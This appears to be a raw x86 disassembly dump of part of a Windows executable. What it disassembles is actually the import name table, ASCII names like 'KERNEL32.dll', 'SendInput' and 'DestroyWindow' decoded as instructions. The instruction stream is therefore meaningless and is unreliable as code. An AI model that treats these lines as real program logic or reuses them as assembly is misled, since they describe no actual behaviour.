  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
